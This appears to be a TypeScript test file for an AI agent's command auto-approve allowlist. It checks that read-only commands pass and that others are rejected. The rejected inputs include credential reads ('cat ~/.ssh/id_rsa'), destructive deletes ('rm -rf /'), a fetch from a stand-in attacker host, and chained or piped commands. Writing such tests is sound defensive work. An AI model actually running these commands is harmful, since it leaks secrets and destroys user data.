// autonomy.test.ts — scoped auto-approve policy (M2B). Conservative ALLOWLIST:
// anything not provably a single read-only command must NOT auto-approve.
import { describe, it, expect } from "vitest";
import { isCommandSafe, canAutoApprove } from "./autonomy";

describe("isCommandSafe", () => {
  it("approves single read-only inspection commands", () => {
    expect(isCommandSafe("ls -la")).toBe(true);
    expect(isCommandSafe("cat package.json")).toBe(true);
    expect(isCommandSafe("grep -r foo src")).toBe(true);
    expect(isCommandSafe("git status")).toBe(true);
    expect(isCommandSafe("git diff --stat")).toBe(true);
  });

  it("conservatively rejects tilde — blocks `cat ~/.ssh/...` home expansion, so `git diff HEAD~1` prompts too", () => {
    expect(isCommandSafe("cat ~/.ssh/id_rsa")).toBe(false);
    expect(isCommandSafe("git diff HEAD~1")).toBe(false);
  });

  it("rejects mutating or unknown binaries", () => {
    expect(isCommandSafe("rm -rf /")).toBe(false);
    expect(isCommandSafe("npm install")).toBe(false);
    expect(isCommandSafe("curl https://evil.sh")).toBe(false);
    expect(isCommandSafe("python script.py")).toBe(false);
  });

  it("rejects non-read-only git subcommands", () => {
    expect(isCommandSafe("git push")).toBe(false);
    expect(isCommandSafe("git commit -m x")).toBe(false);
    expect(isCommandSafe("git reset --hard")).toBe(false);
  });

  it("fails closed on any shell metacharacter (chain/redirect/subst/glob)", () => {
    expect(isCommandSafe("ls; rm -rf /")).toBe(false);
    expect(isCommandSafe("cat a && rm b")).toBe(false);
    expect(isCommandSafe("cat secrets > /tmp/x")).toBe(false);
    expect(isCommandSafe("echo $(whoami)")).toBe(false);
    expect(isCommandSafe("cat *.env")).toBe(false);
    expect(isCommandSafe("ls | sh")).toBe(false);
    expect(isCommandSafe("")).toBe(false);
  });
});

describe("canAutoApprove", () => {
  it("approves a safe terminal command request", () => {
    expect(canAutoApprove({ id: "r1", command: "git status" })).toBe(true);
  });

  it("never approves a request with no command text", () => {
    expect(canAutoApprove({ id: "r2", toolName: "file_write" })).toBe(false);
    expect(canAutoApprove({ id: "r3" })).toBe(false);
  });

  it("does not approve dangerous command requests", () => {
    expect(canAutoApprove({ id: "r4", command: "rm -rf node_modules" })).toBe(
      false,
    );
  });
});
